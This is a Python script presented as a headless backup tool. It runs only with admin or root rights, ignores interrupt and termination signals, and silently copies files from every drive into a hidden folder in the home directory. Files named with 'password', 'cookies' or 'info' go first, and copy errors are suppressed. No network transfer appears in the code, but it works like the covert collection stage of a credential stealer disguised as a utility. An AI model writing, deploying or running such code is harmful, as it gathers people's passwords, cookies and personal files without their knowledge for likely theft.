# backup_script.py
import os
import sys
import subprocess
import signal
import shutil
import string
import socket
import platform

def run_backup_as_admin_headless():
    """
    Headless backup:
      - Returns the path to the backup folder if successful,
        or None if not admin/root.
    """

    def is_admin():
        system_name = platform.system().lower()
        if system_name == "windows":
            try:
                temp_dir = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "Temp")
                test_path = os.path.join(temp_dir, "test_admin.txt")
                with open(test_path, "w") as f:
                    f.write("admin_test")
                os.remove(test_path)
                return True
            except:
                return False
        else:
            return (os.geteuid() == 0)

    # If not admin, return None
    if not is_admin():
        return None

    # Ignore signals (silent)
    def ignore_signal(signum, frame):
        pass
    signal.signal(signal.SIGINT, ignore_signal)
    signal.signal(signal.SIGTERM, ignore_signal)

    IGNORED_EXTENSIONS = {'.tmp', '.log', '.bak', '.~', '.swp', '.ds_store', '.lnk'}
    IGNORED_DIRS = {'temp', 'tmp', 'cache', 'recycle.bin', 'system volume information'}
    USER_FILE_EXTENSIONS = {
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp',
        '.zip', '.rar', '.7z', '.tar', '.gz',
        '.mp4', '.mov', '.avi', '.mkv',
        '.mp3', '.wav', '.ogg'
    }
    ESSENTIAL_KEYWORDS = ['password', 'cookies', 'info']

    def is_essential_file(filename: str) -> bool:
        fl = filename.lower()
        return any(keyword in fl for keyword in ESSENTIAL_KEYWORDS)

    def get_file_category(filepath: str) -> int:
        # 1=essential, 2=user, 3=other
        base = os.path.basename(filepath).lower()
        if is_essential_file(base):
            return 1
        _, ext = os.path.splitext(base)
        if ext in USER_FILE_EXTENSIONS:
            return 2
        return 3

    def should_ignore(name: str) -> bool:
        nl = name.lower()
        if nl in IGNORED_DIRS:
            return True
        _, ext = os.path.splitext(nl)
        return ext in IGNORED_EXTENSIONS

    def list_windows_drives():
        result = []
        for letter in string.ascii_uppercase:
            root = f"{letter}:/"
            if os.path.exists(root):
                result.append(root)
        return result

    def list_unix_mounts():
        mounts = set()
        mounts_file = '/proc/mounts'
        if os.path.isfile(mounts_file):
            try:
                with open(mounts_file, 'r') as f:
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            mnt = parts[1]
                            if not any(mnt.startswith(sp) for sp in ['/proc', '/sys', '/dev', '/run']):
                                mounts.add(mnt)
            except:
                pass
        if not mounts:
            mounts = {'/'}
        return sorted(mounts)

    def scan_drive(drive_path: str, backup_path: str, collected_files: list):
        drive_abs = os.path.abspath(drive_path)
        backup_abs = os.path.abspath(backup_path)

        for root, dirs, files in os.walk(drive_abs, topdown=True):
            # skip backup folder itself
            if backup_abs.startswith(root):
                dirs[:] = []
                continue
            dirs[:] = [d for d in dirs if not should_ignore(d)]
            for filename in files:
                if should_ignore(filename):
                    continue
                full_path = os.path.join(root, filename)
                if full_path.startswith(backup_abs):
                    continue
                collected_files.append(full_path)

    # Determine backup folder
    hostname = socket.gethostname()
    home_dir = os.path.expanduser("~")
    backup_folder = os.path.join(home_dir, f".my_backup_{hostname}")
    os.makedirs(backup_folder, exist_ok=True)

    # List drives to scan
    if os.name == 'nt':
        all_drives = list_windows_drives()
        backup_drive = os.path.splitdrive(backup_folder)[0].upper()
        drives_to_scan = [d for d in all_drives if d[0].upper() != backup_drive[0]]
    else:
        all_mounts = list_unix_mounts()
        drives_to_scan = []
        for m in all_mounts:
            m_abs = os.path.abspath(m)
            # Skip if backup folder is within this mount
            if os.path.commonpath([backup_folder, m_abs]) == m_abs:
                continue
            drives_to_scan.append(m)

    # Collect files
    all_files = []
    for drive in drives_to_scan:
        scan_drive(drive, backup_folder, all_files)

    # Sort them by priority
    categorized = [(f, get_file_category(f)) for f in all_files]
    categorized.sort(key=lambda x: x[1])  # essential(1), user(2), other(3)

    # Copy
    for src, cat in categorized:
        if os.name == "nt":
            rel_path = os.path.relpath(src, os.path.splitdrive(src)[0] + os.sep)
        else:
            rel_path = os.path.relpath(src, '/')
        dest_file = os.path.join(backup_folder, rel_path)
        os.makedirs(os.path.dirname(dest_file), exist_ok=True)
        try:
            shutil.copy2(src, dest_file)
        except:
            # Ignore any copy errors silently
            pass

    return backup_folder  # Return the actual folder path on success
